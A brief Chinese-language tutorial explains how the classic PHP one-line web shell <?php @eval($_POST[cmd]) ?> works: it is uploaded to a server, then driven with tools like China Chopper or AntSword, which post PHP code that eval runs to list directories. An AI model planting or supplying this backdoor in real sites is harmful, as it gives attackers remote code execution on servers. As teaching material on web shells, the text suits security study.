# 一句话木马

以经典的一句话木马<?php @eval($_POST[cmd]) ?>为例。我们需要将含有一句话木马的php文件上传到服务器。访问该php文件时（一般使用工具菜刀或者蚁剑）该文件会接收以post方法传递的name为cmd的数据。使用菜刀等工具进行连接的过程，工具会发送一个形式为：cmd=package 的一个包，其中包的代码是打开指定目录的句柄，然后进行循环扫描，并附带上权限、时间、大小、日期。所以在操作的时候其实就是 key = package然后通过eval函数执行package的php代码 从而最终达到知道所有目录的目的。
